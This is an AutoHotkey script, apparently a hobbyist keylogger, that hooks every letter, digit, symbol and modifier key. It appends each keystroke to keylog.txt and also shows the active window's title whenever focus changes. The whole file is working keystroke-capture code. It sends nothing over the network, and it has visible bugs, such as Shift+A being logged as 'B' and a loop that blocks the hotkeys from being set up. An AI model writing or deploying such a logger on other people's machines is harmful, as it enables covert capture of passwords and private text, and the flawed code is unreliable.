;
; AutoHotkey Version: 1.x
; Language:       English
; Platform:       Win9x/NT
; Author:         A.N.Other <myemail@nowhere.com>
;
; Script Function:
;	Template script (you can customize this template by editing "ShellNew\Template.ahk" in your Windows folder)
;

#NoEnv ; Recommended for performance and compatibility with future AutoHotkey releases.
SendMode Input ; Recommended for new scripts due to its superior speed and reliability.

; Detect hidden windows since they can be active
; (e.g. AutoHotkey main window while using Menu,MenuName,Show.)

DetectHiddenWindows, On
Loop {
    WinWaitNotActive, % "ahk_id " WinActive("A")
    WinGetActiveTitle, Title
    ToolTip, %Title% 
    SoundPlay, *-1 
}

~a::fileappend, a, keylog.txt
~b::fileappend, b, keylog.txt
~c::fileappend, c, keylog.txt
~d::fileappend, d, keylog.txt
~e::fileappend, e, keylog.txt
~f::fileappend, f, keylog.txt
~g::fileappend, g, keylog.txt
~h::fileappend, h, keylog.txt
~i::fileappend, i, keylog.txt
~j::fileappend, j, keylog.txt
~k::fileappend, k, keylog.txt
~l::fileappend, l, keylog.txt
~m::fileappend, m, keylog.txt
~n::fileappend, n, keylog.txt
~o::fileappend, o, keylog.txt
~p::fileappend, p, keylog.txt
~q::fileappend, q, keylog.txt
~r::fileappend, r, keylog.txt
~s::fileappend, s, keylog.txt
~t::fileappend, t, keylog.txt
~u::fileappend, u, keylog.txt
~v::fileappend, v, keylog.txt
~w::fileappend, w, keylog.txt
~x::fileappend, x, keylog.txt
~y::fileappend, y, keylog.txt
~z::fileappend, z, keylog.txt

~+A::fileappend, B, keylog.txt
~+B::fileappend, B, keylog.txt
~+C::fileappend, C, keylog.txt
~+D::fileappend, D, keylog.txt
~+E::fileappend, E, keylog.txt
~+F::fileappend, F, keylog.txt
~+G::fileappend, G, keylog.txt
~+H::fileappend, H, keylog.txt
~+I::fileappend, I, keylog.txt
~+J::fileappend, J, keylog.txt
~+K::fileappend, K, keylog.txt
~+L::fileappend, L, keylog.txt
~+M::fileappend, M, keylog.txt
~+N::fileappend, N, keylog.txt
~+O::fileappend, O, keylog.txt
~+P::fileappend, P, keylog.txt
~+Q::fileappend, Q, keylog.txt
~+R::fileappend, R, keylog.txt
~+S::fileappend, S, keylog.txt
~+T::fileappend, T, keylog.txt
~+U::fileappend, U, keylog.txt
~+V::fileappend, V, keylog.txt
~+W::fileappend, W, keylog.txt
~+X::fileappend, X, keylog.txt
~+Y::fileappend, Y, keylog.txt
~+Z::fileappend, Z, keylog.txt

~1::fileappend, 1, keylog.txt
~2::fileappend, 2, keylog.txt
~3::fileappend, 3, keylog.txt
~4::fileappend, 4, keylog.txt
~5::fileappend, 5, keylog.txt
~6::fileappend, 6, keylog.txt
~7::fileappend, 7, keylog.txt
~8::fileappend, 8, keylog.txt
~9::fileappend, 9, keylog.txt
~0::fileappend, 0, keylog.txt
	
~`::fileappend, `, keylog.txt
~!::fileappend, !, keylog.txt
~@::fileappend, @, keylog.txt
~#::fileappend, #, keylog.txt
~$::fileappend, $, keylog.txt
~^::fileappend, ^, keylog.txt
~&::fileappend, &, keylog.txt
~*::fileappend, *, keylog.txt
~(::fileappend, (, keylog.txt
~)::fileappend, ), keylog.txt
~-::fileappend, -, keylog.txt
~_::fileappend, _, keylog.txt
~=::fileappend, =, keylog.txt
~+::fileappend, +, keylog.txt
~[::fileappend, [, keylog.txt
~{::fileappend, {, keylog.txt
~]::fileappend, ], keylog.txt
~}::fileappend, }, keylog.txt
~\::fileappend, \, keylog.txt
~|::fileappend, |, keylog.txt
~;::fileappend, ;, keylog.txt
~'::fileappend, ', keylog.txt
~<::fileappend, <, keylog.txt
~.::fileappend, ., keylog.txt
~>::fileappend, >, keylog.txt
~/::fileappend, /, keylog.txt
~?::fileappend, ?, keylog.txt

~enter::fileappend, {\n}, keylog.txt
~space::fileappend, {\s}, keylog.txt
~tab::fileappend, {\t}, keylog.txt
~CapsLock::fileappend, {\caps}, keylog.txt
~backspace::fileappend, {\back}, keylog.txt

~LWin::fileappend, {\LWin}, keylog.txt
~RWin::fileappend, {\RWin}, keylog.txt
~LAlt::fileappend, {\LAlt}, keylog.txt
~RAlt::fileappend, {\RAlt}, keylog.txt
~LCtrl::fileappend, {\LCtrl}, keylog.txt
~RCtrl::fileappend, {\RCtrl}, keylog.txt

~LShift::fileappend, {\LShift}, keylog.txt
~RShift::fileappend, {\RShift}, keylog.txt
